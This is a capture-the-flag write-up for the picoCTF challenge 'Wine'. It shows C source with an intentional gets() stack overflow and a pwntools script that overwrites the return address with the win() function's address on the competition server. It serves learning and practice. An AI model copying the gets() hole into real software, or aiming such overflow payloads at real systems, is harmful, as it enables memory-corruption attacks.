# Write-up of the challenge "Wine"

This challenge is part of the "Binary exploitation" category and is in the hard category.

# Goal of the challenge

The objective of the challenge is it just asks you to input something.

## Program structure

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void win(){
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("flag.txt not found in current directory.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

void vuln()
{
  printf("Give me a string!\n");
  char buf[128];
  gets(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);
  vuln();
  return 0;
}



```

## Problem

So we can see very cleary that this is a basic **"ret2win"**. However I tried to decompile and find the **"$RIP"** offset. I could not see it and then I tried to do **"cylic pattern"** and for some reason it didn't work on .exe files. I even tried to use the LLM's to make it anaylze the assembly code and find the **"$RIP"**, also no luck. At this point it was 7 AM on a random monday and I needed to leave my home house to make sure I come on time in highschool. So I just took the easy way out and bruteforced the **"$RIP"** .

## Security breach

This is bad **"gets(buf);"** because we can buffer overflow and overrite "$RIP".


## Solution

So I bruteforced the **"$RIP"** offset and then placed the address of win afterward. Unfortunately, I accidentally deleted the bruteforce code snippet.

```
from pwn import *

win = 0x00401530

p = remote('saturn.picoctf.net', 63035)

payload = b'A' * 140 + p32(win)

p.sendline(payload)

p.interactive()

```


If you liked this writeup you can star my repository.